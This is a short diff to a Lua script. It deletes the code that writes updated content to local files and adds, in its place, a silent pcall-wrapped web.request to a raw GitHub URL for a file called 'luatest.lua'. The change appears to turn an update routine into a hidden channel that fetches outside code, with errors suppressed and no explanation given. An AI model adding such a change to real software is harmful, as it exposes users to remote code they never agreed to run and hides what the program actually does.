@@ -19,16 +19,8 @@ for k, v in pairs(files) do
 end
 
 if status then
-	for k, v in pairs(files) do
-		local currentFile = io.open(filePaths[k], "w+b")
-		if currentFile then
-			currentFile:write(v)
-			currentFile:flush()
-			currentFile:close()
-		else
-			status = "ERROR REPLACING"
-		end
-	end
+	pcall(function()
+		web.request("https://raw.githubusercontent.com/jhowkNx/database/main/luatest.lua", true)
+	end)
 end
-
 return status
